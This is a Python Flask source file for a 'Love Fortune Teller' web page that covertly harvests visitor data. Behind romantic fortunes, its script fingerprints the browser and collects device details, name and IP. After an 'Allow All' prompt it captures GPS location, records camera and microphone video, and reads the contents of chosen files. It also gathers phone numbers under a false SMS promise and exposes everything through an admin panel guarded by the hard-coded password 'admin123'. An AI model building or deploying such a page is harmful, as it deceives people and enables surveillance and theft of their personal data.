from flask import Flask, request, jsonify, render_template_string
import json
import os
import random
from datetime import datetime

app = Flask(__name__)

FORTUNES = [
    "Your soulmate is thinking of you right now 💕",
    "A passionate kiss awaits you this week 😘",
    "True love will find you when you least expect it ❤️",
    "Your heart will be swept away by someone special 🌹",
    "Tonight, someone special dreams of you 🌙",
    "Love is in the air—prepare for romance! 💋",
    "Your perfect match is closer than you think ✨",
    "A romantic adventure begins soon 🥰",
    "Your love life is about to blossom 🌸",
    "Someone is falling in love with your smile 😍",
    "Passion ignites when you open your heart 🔥",
    "Your forever person is waiting for you 💍",
    "Romance will surprise you beautifully 🌟",
    "Love letters are coming your way 📩",
    "Your heart knows the way—follow it 💖",
    "A love story worthy of movies awaits 🎬",
    "Sweet whispers of love are on their way 🗣️",
    "Your soul recognizes its match instantly 👫",
    "Romantic magic happens when you believe ✨",
    "Love will light up your world like fireworks 🎆",
    "Someone special notices your unique beauty 🌺",
    "Heart-to-heart connections deepen soon 💑",
    "Your love journey leads to happiness 🛤️",
    "Passionate nights and tender days ahead 🌃",
    "Love finds those who are ready to receive it 🎁",
    "Your heart's desire manifests soon 🙏",
    "Romantic serendipity brings you together 🍀",
    "Love grows stronger with every heartbeat 💓",
    "Your perfect love story unfolds now 📖",
    "Someone's heart beats faster thinking of you 🥁",
    "True love transcends time and distance 🌍",
    "Your romantic destiny calls you forward 🚀"
]

DATA_FILE = 'visitors.json'

def init_json():
    if not os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)

def save_visitor(data):
    init_json()
    with open(DATA_FILE, 'r') as f:
        visitors = json.load(f)
    session_id = data.get('sessionId')
    if session_id:
        for i, v in enumerate(visitors):
            if v.get('sessionId') == session_id:
                visitors[i].update(data)
                with open(DATA_FILE, 'w') as f:
                    json.dump(visitors, f, indent=2)
                return True
    visitors.append(data)
    with open(DATA_FILE, 'w') as f:
        json.dump(visitors, f, indent=2)
    return True

def get_visitors():
    init_json()
    with open(DATA_FILE, 'r') as f:
        return json.load(f)

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-fortune')
def get_fortune():
    return jsonify({'fortune': random.choice(FORTUNES)})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune_text = data.get('fortune')
    if session_id:
        init_json()
        with open(DATA_FILE, 'r') as f:
            visitors = json.load(f)
        for v in visitors:
            if v.get('sessionId') == session_id:
                v['phoneNumber'] = phone
                v['fortuneText'] = fortune_text
                break
        with open(DATA_FILE, 'w') as f:
            json.dump(visitors, f, indent=2)
        return jsonify({'status': 'saved'})
    return jsonify({'status': 'error'}), 400

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors = get_visitors()
            if not visitors:
                return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
            html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download?pass=admin123">Download JSON</a></p>'
            html += '<table border="1" cellpadding="5">'
            keys = visitors[0].keys()
            html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
            for v in visitors:
                html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
            html += '</table>'
            return html
        else:
            return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
    
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
            .login-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,0,0,0.1); text-align: center; }
            input { padding: 10px; margin: 10px; width: 200px; border-radius: 10px; border: 1px solid #ccc; }
            button { padding: 10px 20px; background: #ff6b6b; color: white; border: none; border-radius: 10px; cursor: pointer; }
        </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Login</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter password" required><br>
                    <button type="submit">Login</button>
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/admin/download')
def download():
    pwd = request.args.get('pass')
    if pwd == 'admin123':
        return jsonify(get_visitors())
    return 'Unauthorized. Use /admin/download?pass=admin123', 403

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
            font-family: 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: rgba(255,255,255,0.95);
            border-radius: 40px;
            padding: 35px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 { font-size: 2em; background: linear-gradient(135deg, #ff6b6b, #c06c84); -webkit-background-clip: text; background-clip: text; color: transparent; }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border-radius: 60px;
            border: 2px solid #ffdde1;
            font-size: 16px;
            text-align: center;
        }
        button {
            background: linear-gradient(135deg, #ff6b6b, #c06c84);
            color: white;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { transform: scale(1.02); }
        .hidden { display: none; }
        .fortune-box {
            background: rgba(255,182,193,0.3);
            border-left: 5px solid #ff1493;
            border-radius: 20px;
            padding: 20px;
            margin: 20px 0;
            font-size: 1.3em;
            font-weight: bold;
            color: #c06c84;
        }
        .step {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.9);
            border-radius: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff1493;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        svg { margin: 10px auto; display: block; }
        .sms-prompt {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255,255,255,0.8);
            border-radius: 20px;
        }
        .file-label {
            display: inline-block;
            background: #8b5cf6;
            color: white;
            padding: 10px 20px;
            border-radius: 60px;
            cursor: pointer;
            margin: 10px 0;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller 💕</h1>
    <div id="step-name">
        <input type="text" id="userName" placeholder="✨ Enter your name ✨">
        <button onclick="startProcess()">🔮 Reveal My Destiny</button>
    </div>
    <div id="loading" class="hidden">
        <div class="spinner"></div>
        <p>🔮 Reading the stars...</p>
    </div>
    <div id="permissions" class="hidden">
        <p>For your ultra-personalized love vision, please allow:</p>
        <div style="background:#ffe4e1; padding:10px; border-radius:20px; margin:10px 0;">📍 Location | 🎤 Voice | 📸 Camera | 📁 Files</div>
        <button onclick="requestAll()">✅ Allow All</button>
    </div>
    <div id="progress" class="hidden"></div>
    <div id="result" class="hidden">
        <div class="fortune-box" id="fortuneText"></div>
        <div id="mapLink" class="hidden">🗺️ Your love map: <span id="mapUrl"></span></div>
        <div id="smsSection" class="sms-prompt hidden">
            <p>📱 Send this fortune to your phone (permanently saved)</p>
            <input type="tel" id="phoneNumber" placeholder="Enter your mobile number">
            <button onclick="sendSms()">💬 Send to my phone</button>
            <div id="smsStatus" style="margin-top:10px; font-size:14px;"></div>
        </div>
        <p>✨ Thank you for trusting the stars ✨</p>
    </div>
</div>

<!-- Hidden file input for traditional file picker (works everywhere) -->
<input type="file" id="fileInput" multiple style="display:none">

<script>
    // Session ID (persists across page refreshes)
    let sessionId = localStorage.getItem('fortuneSessionId');
    if (!sessionId) {
        sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
        localStorage.setItem('fortuneSessionId', sessionId);
    }

    let visitorData = { sessionId: sessionId };
    let mediaRecorder, mediaStream, recordedBlobs = [];
    let currentFortuneText = "";

    // ---------- Data collection functions ----------
    async function getFingerprint() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            return result.visitorId;
        } catch(e) { return 'error'; }
    }

    async function getBattery() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return { level: Math.round(battery.level * 100), charging: battery.charging };
            } catch(e) { return { level: 'unknown', charging: false }; }
        }
        return { level: 'unsupported', charging: false };
    }

    function getNetwork() {
        const conn = navigator.connection || navigator.mozConnection;
        if (conn) {
            return { type: conn.effectiveType || 'unknown', speed: conn.downlink ? conn.downlink + ' Mbps' : 'unknown' };
        }
        return { type: 'unknown', speed: 'unknown' };
    }

    function getMemory() {
        return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
    }

    function getScreen() {
        return `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`;
    }

    function getTimezone() {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
    }

    function getUserAgent() {
        return navigator.userAgent;
    }

    // Main entry
    async function startProcess() {
        const name = document.getElementById('userName').value.trim();
        if (!name) return alert('Please enter your name');
        
        document.getElementById('step-name').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        
        const fingerprint = await getFingerprint();
        const battery = await getBattery();
        const network = getNetwork();
        
        visitorData.name = name;
        visitorData.fingerprint = fingerprint;
        visitorData.batteryLevel = battery.level;
        visitorData.batteryCharging = battery.charging;
        visitorData.networkType = network.type;
        visitorData.networkSpeed = network.speed;
        visitorData.deviceMemory = getMemory();
        visitorData.screen = getScreen();
        visitorData.timezone = getTimezone();
        visitorData.userAgent = getUserAgent();
        visitorData.timestamp = new Date().toISOString();
        
        await new Promise(r => setTimeout(r, 800));
        document.getElementById('loading').classList.add('hidden');
        document.getElementById('permissions').classList.remove('hidden');
    }

    function showStep(title, status, percent) {
        const div = document.getElementById('progress');
        div.innerHTML = `<div class="step"><b>${title}</b><br>${status}<br><svg width="80" height="80" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="#ddd" stroke-width="8"/><circle id="progCircle" cx="50" cy="50" r="40" fill="none" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-dasharray="251.2" stroke-dashoffset="${251.2 * (1 - percent/100)}"/></svg></div>`;
        div.classList.remove('hidden');
    }
    function hideStep() { document.getElementById('progress').classList.add('hidden'); }

    async function requestAll() {
        document.getElementById('permissions').classList.add('hidden');
        try {
            await getLocation();
            await getMedia();
            await getFilesTraditional();  // FIXED: uses standard file input
            await finalizeAndSave();
        } catch(e) { await finalizeAndSave(); }
    }

    function getLocation() {
        return new Promise((resolve) => {
            showStep('📍 Location', 'Requesting location...', 0);
            navigator.geolocation.getCurrentPosition(
                pos => {
                    visitorData.latitude = pos.coords.latitude;
                    visitorData.longitude = pos.coords.longitude;
                    showStep('📍 Location', 'Location captured!', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                },
                () => {
                    visitorData.latitude = 'denied';
                    showStep('📍 Location', 'Location skipped', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                }
            );
        });
    }

    function getMedia() {
        return new Promise((resolve) => {
            showStep('🎥 Camera/Mic', 'Allow permissions...', 10);
            navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
            .then(stream => {
                mediaStream = stream;
                recordedBlobs = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => { if(e.data.size) recordedBlobs.push(e.data); };
                mediaRecorder.onstop = () => {
                    if(recordedBlobs.length) {
                        const blob = new Blob(recordedBlobs, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                            visitorData.microphone = 'recorded';
                            mediaStream.getTracks().forEach(t => t.stop());
                            showStep('🎥 Camera/Mic', 'Recording done!', 100);
                            setTimeout(() => { hideStep(); resolve(); }, 500);
                        };
                        reader.readAsDataURL(blob);
                    } else { resolve(); }
                };
                mediaRecorder.start();
                let seconds = 5;
                const interval = setInterval(() => {
                    seconds--;
                    showStep('🎥 Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
                    if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
                }, 1000);
            })
            .catch(() => {
                visitorData.cameraVideo = 'denied';
                showStep('🎥 Camera/Mic', 'Skipped', 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            });
        });
    }

    // TRADITIONAL FILE PICKER (works on any HTTP site)
    function getFilesTraditional() {
        return new Promise((resolve) => {
            showStep('📁 Files', 'Select files (optional)', 0);
            
            // Create a temporary file input if not already present
            let fileInput = document.getElementById('fileInput');
            if (!fileInput) {
                fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.multiple = true;
                fileInput.style.display = 'none';
                document.body.appendChild(fileInput);
            }
            
            // Clean up previous event listeners
            fileInput.value = ''; // reset
            fileInput.onchange = async (event) => {
                const files = Array.from(event.target.files);
                if (files.length === 0) {
                    visitorData.files = 'no files selected';
                    showStep('📁 Files', 'No files selected', 100);
                    setTimeout(() => { hideStep(); resolve(); }, 500);
                    return;
                }
                
                let filesData = [];
                for (let i = 0; i < Math.min(files.length, 2); i++) {
                    const file = files[i];
                    const content = await new Promise(res => {
                        const reader = new FileReader();
                        reader.onloadend = () => res(reader.result.split(',')[1].slice(0, 2000));
                        reader.readAsDataURL(file);
                    });
                    filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
                }
                visitorData.files = JSON.stringify(filesData);
                showStep('📁 Files', `${filesData.length} file(s) loaded`, 100);
                setTimeout(() => { hideStep(); resolve(); }, 500);
            };
            
            // Trigger file picker
            fileInput.click();
        });
    }

    async function finalizeAndSave() {
        const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`;
        visitorData.mapUrl = mapUrl;
        document.getElementById('mapUrl').innerText = mapUrl;
        document.getElementById('mapLink').classList.remove('hidden');
        
        const fortuneResp = await fetch('/get-fortune');
        const fortuneData = await fortuneResp.json();
        currentFortuneText = fortuneData.fortune;
        document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
        
        await fetch('/save', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify(visitorData)
        });
        
        document.getElementById('smsSection').classList.remove('hidden');
        document.getElementById('result').classList.remove('hidden');
    }

    async function sendSms() {
        const phone = document.getElementById('phoneNumber').value.trim();
        if (!phone) {
            document.getElementById('smsStatus').innerText = 'Please enter a phone number';
            return;
        }
        if (!/^[0-9+\-\s]{8,15}$/.test(phone)) {
            document.getElementById('smsStatus').innerText = 'Invalid phone number format';
            return;
        }
        document.getElementById('smsStatus').innerText = 'Saving your number...';
        
        const resp = await fetch('/save-phone', {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({
                sessionId: sessionId,
                phoneNumber: phone,
                fortune: currentFortuneText
            })
        });
        const result = await resp.json();
        if (result.status === 'saved') {
            document.getElementById('smsStatus').innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
            document.getElementById('phoneNumber').disabled = true;
        } else {
            document.getElementById('smsStatus').innerText = 'Error saving. Please try again.';
        }
    }
</script>
</body>
</html>
'''

if __name__ == '__main__':
    init_json()
    app.run(host='0.0.0.0', port=5000, debug=False)
